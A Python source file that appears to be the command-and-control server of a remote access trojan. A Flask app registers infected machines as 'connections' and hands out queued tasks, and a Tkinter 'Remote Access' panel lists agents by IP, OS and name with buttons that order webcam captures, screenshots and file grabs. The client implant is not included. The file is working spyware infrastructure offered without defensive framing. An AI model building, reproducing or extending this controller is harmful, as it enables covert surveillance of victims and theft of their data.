from flask import Flask, request, jsonify
import threading
import tkinter as tk
import time
import queue
from tkinter import ttk

log_queue = queue.Queue()
OFFLINE_TIMEOUT = 15
OFFLINE_CHECK_PERIOD = 5
users = []

def get_user(id):
    for user in users:
        if id == user.id: return user
    return False

class Connections:
    def __init__(self, id, ip, os, name):
        self.id = id
        self.ip = ip
        self.os = os
        self.name = name
        self.time_last_seen = time.time()
        self.status = "online"
        self.task_queue = []

    def has_task(self):
        return len(self.task_queue) > 0

    def add_task(self, task):
        self.task_queue.append(task)

    def get_next_task(self):
        if not self.has_task():
            return None

        return self.task_queue.pop(0)
        
    
    

app = Flask(__name__)


def render():
    global root, console

    root = tk.Tk()
    root.title("Remote Access")
    root.geometry("1200x800")
    root.configure(bg="#0D0D0D")

    console_frame = tk.Frame(root, width=500, bg="#000000")
    console_frame.pack(side="right", fill="y")
    console_frame.pack_propagate(False)

    console_title = tk.Label(
        console_frame,
        text="Console",
        bg="#000000",
        fg="#FFFFFF",
        font=("Menlo", 14, "bold")
    )
    console_title.pack(anchor="w", padx=10, pady=(10, 0))

    console = tk.Text(
        console_frame,
        bg="#000000",
        fg="#FFFFFF",
        font=("Menlo", 11),
        state="disabled",
        bd=0,
        highlightthickness=0,
        relief="flat",
        cursor="arrow"
    )
    console.pack(fill="both", expand=True, padx=10, pady=10)


    active_frame = tk.Frame(root, width=700, bg="#0D0D0D")
    active_frame.pack(side="left", fill="both", expand=True)
    active_frame.pack_propagate(False)

    title = tk.Label(
        active_frame,
        text="Active Connections",
        bg="#0D0D0D",
        fg="#FFFFFF",
        font=("Menlo", 18, "bold")
    )
    title.pack(anchor="w", padx=15, pady=(15, 5))


    connections_table = ttk.Treeview(
        active_frame,
        columns=("id", "ip", "os", "name", "status"),
        show="headings",
        selectmode="browse"
    )

    connections_table.heading("id", text="ID")
    connections_table.heading("ip", text="IP")
    connections_table.heading("os", text="OS")
    connections_table.heading("name", text="Name")
    connections_table.heading("status", text="Status")

    connections_table.column("id", width=130, anchor="center")
    connections_table.column("ip", width=130, anchor="center")
    connections_table.column("os", width=100, anchor="center")
    connections_table.column("name", width=190, anchor="center")
    connections_table.column("status", width=100, anchor="center")

    connections_table.tag_configure("online", foreground="#00FF88")
    connections_table.tag_configure("offline", foreground="#FF4444")

    connections_table.pack(fill="both", expand=True, padx=15, pady=10)

    # =========================
    # Actions
    # =========================
    actions_frame = tk.Frame(active_frame, bg="#0D0D0D")
    actions_frame.pack(fill="x", padx=15, pady=(0, 15))

    def get_selected_agent_id():
        selected = connections_table.selection()

        if not selected:
            log("[-] No agent selected")
            return None


        return selected[0]

    def send_ui_task(task_name):
        agent_id = get_selected_agent_id()

        if not agent_id:
            return

        allowed_tasks = {
            "WEBCAM": "WEBCAM",
            "SCREENSHOT": "SCREENSHOT",
            "FILES": "FILES"
        }

        if task_name not in allowed_tasks:
            log(f"[-] Unknown task: {task_name}")
            return

        task = allowed_tasks[task_name]
        
        get_user(agent_id).add_task(task)
        log(f"[+] {task} for {agent_id} queued")
        
        

    webcam_btn = tk.Button(
        actions_frame,
        text="WEBCAM",
        command=lambda: send_ui_task("WEBCAM"),
        bg="#1A1A1A",
        fg="#FFFFFF",
        activebackground="#2A2A2A",
        activeforeground="#FFFFFF",
        relief="flat",
        padx=15,
        pady=6
    )
    webcam_btn.pack(side="left", padx=(0, 8))

    screenshot_btn = tk.Button(
        actions_frame,
        text="SCREENSHOT",
        command=lambda: send_ui_task("SCREENSHOT"),
        bg="#1A1A1A",
        fg="#FFFFFF",
        activebackground="#2A2A2A",
        activeforeground="#FFFFFF",
        relief="flat",
        padx=15,
        pady=6
    )
    screenshot_btn.pack(side="left", padx=8)

    file_btn = tk.Button(
        actions_frame,
        text="FILE",
        command=lambda: send_ui_task("FILES"),
        bg="#1A1A1A",
        fg="#FFFFFF",
        activebackground="#2A2A2A",
        activeforeground="#FFFFFF",
        relief="flat",
        padx=15,
        pady=6
    )
    file_btn.pack(side="left", padx=8)


    def update_connections_list():
        selected = connections_table.selection()
        selected_id = selected[0] if selected else None

        for item in connections_table.get_children():
            connections_table.delete(item)

        for user in users:
            status_tag = "online" if user.status == "online" else "offline"

            connections_table.insert(
                "",
                "end",
                iid=user.id,
                values=(
                    user.id,
                    user.ip,
                    user.os,
                    user.name,
                    user.status
                ),
                tags=(status_tag,)
            )

        if selected_id and connections_table.exists(selected_id):
            connections_table.selection_set(selected_id)
            connections_table.focus(selected_id)

        root.after(1000, update_connections_list)


    def update_console():
        while not log_queue.empty():
            message = log_queue.get()

            console.config(state="normal")
            console.insert("end", message + "\n")
            console.see("end")
            console.config(state="disabled")

        root.after(300, update_console)

    update_connections_list()
    update_console()

    root.mainloop()
def log(message):
    print(message)
    log_queue.put(message)

    
@app.route("/info", methods=["POST"])
def get_info():
    data = request.get_json()
    
    try: 
        id = data.get("id")
        os = data.get("os")
        name = data.get("name")
    except ValueError as e:
        log("[-] Fetching connection error: {e}")  
    if get_user(id) == False: 
        new_user = Connections(id,request.remote_addr,os,name)
        users.append(new_user)
        log(f"\n[+] New connection from {request.remote_addr}")
        log(f"INFO:\n-> ID : {new_user.id}\n-> IP : {new_user.ip}\n-> OS : {new_user.os}\n-> NAME : {new_user.name}\n")
        get_user(id).time_last_seen = time.time()
    else:
        log(f"[+] {get_user(id).ip} connected")
        get_user(id).time_last_seen = time.time()
    return "OK"

@app.route("/tasks", methods=["POST"])
def task_check():
    data = request.get_json()

    if not data:
        return jsonify({"error": "JSON required"}), 400

    id = data.get("id")
    endpoint = get_user(id)

    if endpoint == False:
        log("[-] Aborted: Unknown Endpoint")
        return jsonify({"error": "unknown endpoint"}), 404

    endpoint.time_last_seen = time.time()
    endpoint.status = "online"

    if endpoint.has_task():
        task = endpoint.get_next_task()
        return jsonify({"task": task})

    return jsonify({"task": "NONE"})
    
    

def handling_inactive_connections(connections):
    while True:
        for con in connections:
            if time.time() - con.time_last_seen >= OFFLINE_TIMEOUT: con.status="offline"
            else: con.status = "online"
        time.sleep(OFFLINE_CHECK_PERIOD)
        

            
    

def run_server():
    app.run(debug=True, use_reloader=False)



if __name__ == "__main__":
    checker_thread = threading.Thread(
        target=handling_inactive_connections,
        args=(users,),
        daemon=True
    )

    server_thread = threading.Thread(
        target=run_server,
        daemon=True
    )

    checker_thread.start()
    server_thread.start()

    render()